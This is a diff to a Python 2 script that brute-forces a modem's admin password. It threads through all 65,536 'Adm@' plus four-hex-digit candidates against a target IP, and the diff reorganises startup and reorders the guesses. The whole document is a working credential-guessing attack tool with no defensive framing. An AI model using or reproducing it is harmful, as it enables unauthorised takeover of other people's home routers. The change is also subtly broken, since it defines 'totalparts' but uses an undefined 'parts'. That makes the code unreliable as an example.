@@ -9,15 +9,12 @@ import sys
 import timeit
 from requests.exceptions import ConnectionError
 
-if len(sys.argv)== 2:
-    target = str(sys.argv[1])
-else:
-    print 'Usage: {} [TARGET_IP]'.format(sys.argv[0])
-    sys.exit(2)
-
 queue = Queue.Queue()
 threads = []
 start = timeit.default_timer()
+
+#manipulated variable
+totalparts=8 #better can devide the 65536 equally
 
 class BruteThread(threading.Thread):
     def __init__(self, queue, tid):
@@ -26,6 +23,7 @@ class BruteThread(threading.Thread):
         self.tid = tid
 
     def run(self):
+
         while True:
             try:
                 num=self.queue.get(timeout=1)
@@ -51,7 +49,7 @@ class BruteThread(threading.Thread):
                 print "\r\033[92mUsed {} Seconds to complete.\033[0m".format(stop - start)
                 os.kill(os.getpid(), 2)
             else:
-                print "\r\033[91m[-] Attempt failed. TEST {} : {}, RESULT: {}\033[0m".format(num,dapw, 'Failed')
+                print "\r\033[91m[-] Attempt failed. TEST {}\t: {}, RESULT: {}\033[0m".format(num,dapw, 'Failed')
             self.queue.task_done()
 
 def verify(target):
@@ -64,14 +62,6 @@ def verify(target):
         print "\r\033[91m[-] Target Modem model not supported.\033[0m"
         sys.exit(2)
 
-verify(target)
-
-for i in range(1,10):
-    worker = BruteThread(queue,i)
-    worker.setDaemon(True)
-    worker.start()
-    threads.append(worker)
-
 def numtoPW(x):
     backnum = len(hex(x).split('0x')[1])
     if backnum < 4:
@@ -81,13 +71,39 @@ def numtoPW(x):
         num = hex(x).split('0x')[1]
         return ('Adm@' + num.upper())
 
-for x in xrange(65536):
-    queue.put(x)
 
-queue.join()
+if __name__ == '__main__' :
 
-for item in threads:
-    item.join()
+    if len(sys.argv)== 2:
+        target = str(sys.argv[1])
+    else:
+        print 'Usage: {} [TARGET_IP]'.format(sys.argv[0])
+        sys.exit(2)
 
-print 'Done!'
-os.kill(os.getpid(), 2)
+    verify(target)
+
+    for i in range(1,10):
+        worker = BruteThread(queue,i)
+        worker.setDaemon(True)
+        worker.start()
+        threads.append(worker)
+
+    part=0
+    count_in_part=0
+    for x in xrange(65536):
+        num=(65536/parts*part)+count_in_part
+        queue.put(num)
+
+        if part>=parts-1:
+            count_in_part+=1
+            part=0
+        else:
+            part+=1
+
+    queue.join()
+
+    for item in threads:
+        item.join()
+
+    print 'Done!'
+    os.kill(os.getpid(), 2)
